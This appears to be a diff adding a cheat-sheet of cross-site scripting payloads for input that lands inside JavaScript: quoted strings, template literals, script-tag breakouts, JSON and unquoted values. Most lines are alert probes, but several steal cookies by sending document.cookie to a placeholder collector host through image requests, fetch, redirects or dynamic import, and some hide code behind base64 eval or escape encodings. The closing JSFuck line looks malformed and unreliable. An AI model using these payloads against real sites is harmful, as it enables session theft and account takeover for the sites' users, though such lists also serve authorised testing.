@@ -1,0 +1,79 @@
+# XSS Payloads: JavaScript Context
+# Use when input lands inside a <script> block or JS file
+
+# --- Inside a JS string (single-quoted) ---
+'-alert(document.domain)-'
+';alert(document.domain);//
+';alert(document.domain)//
+';alert(document.cookie);var foo='
+';confirm('XSS');//
+';new Image().src='//COLLECTOR/?c='+document.cookie;//
+';document.location='//COLLECTOR/?c='+document.cookie;//
+';eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));//
+';throw new Error();//
+';import('//COLLECTOR');//
+';top['alert'](document.domain);//
+
+# --- Inside a JS string (double-quoted) ---
+\"-alert(document.domain)-\"
+\";alert(document.domain);//
+\";alert(document.cookie);//
+\";confirm('XSS');//
+\";new Image().src='//COLLECTOR/?c='+document.cookie;//
+\";eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));//
+\";document.location='//COLLECTOR/?c='+document.cookie;//
+
+# --- Inside template literal (backtick) ---
+${alert(document.domain)}
+${confirm('XSS')}
+${document.location='//COLLECTOR/?c='+document.cookie}
+${fetch('//COLLECTOR/?c='+document.cookie)}
+${new Image().src='//COLLECTOR/?c='+document.cookie}
+${7*7}
+${document.domain}
+${constructor.constructor('alert(document.domain)')()}
+${eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))}
+
+# --- Breaking out of <script> tag ---
+</script><script>alert(document.domain)</script>
+</script><img src=x onerror=alert(document.domain)>
+</script><svg onload=alert(document.domain)>
+</script><input autofocus onfocus=alert(document.domain)>
+</script><details open ontoggle=alert(document.domain)>
+
+# --- After breaking out, back in with HTML comment ---
+</script><!--><script>alert(document.domain)</script>
+</script><!--'><script>alert(document.domain)</script>
+</script><!--"><script>alert(document.domain)</script>
+
+# --- Inside JS comment (close then inject) ---
+// alert(document.domain)
+/* alert(document.domain) */
+
+# --- Inside JS string with URL/JSON encoding ---
+\'-alert(1)-'
+\\'-alert(1)-'
+\\";alert(1);//
+
+# --- JSON context ---
+";alert(document.domain);"
+'-alert(1)-'
+</script><script>alert(1)</script>
+
+# --- No-quote break (if value is not quoted) ---
+;alert(document.domain);//
+;alert(document.domain);var foo=
+;confirm('XSS');var foo=
+;fetch('//COLLECTOR/?c='+document.cookie);var foo=
+
+# --- Unicode escape inside JS ---
+\u0061\u006c\u0065\u0072\u0074(document.domain)
+
+# --- Hex escape inside JS ---
+\x61\x6c\x65\x72\x74(document.domain)
+
+# --- Octal escape inside JS ---
+\141\154\145\162\164(document.domain)
+
+# --- JSFuck style (no alphanumeric) ---
+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+!![]+[+!![]]]+(+[]+{})[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]]]+(!![]+[])[+!![]+[+!![]]]+(!![]+[])[+[]+[+!![]+[+!![]+[+!![]]]]]+(+[]+{})[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]]+([][[]]+[])[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]]]+(![]+[])[+!![]+[+!![]+[+!![]]]]+([][[]]+[])[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]]]+(!![]+[])[+[]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]+(![]+[])[+!![]+[+!![]+[+!![]]]]+(+(+!![]+!![]+!![]+!![]+[])+(!![]+[])[+!![]+[+!![]+[+!![]+[+!![]]]]]+[+[]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]]]+(!![]+[])[+[]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]+([![]]+[][[]])[+!![]+[+[]]]+(+(+!![]+!![]+[])+(!![]+[])[+!![]+[+!![]+[+!![]+[+!![]]]]]+[+[]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]]]+(+(+!![]+[])+(+[]+{})[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]]+(![]+[])[+!![]+[+!![]+[+!![]]]]+([][[]]+[])[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]]]+(!![]+[])[+[]+[+!![]+[+!![]+[+!![]+[+!![]]]]]]+(![]+[])[+!![]+[+!![]+[+!![]]]])()+(-{}))()
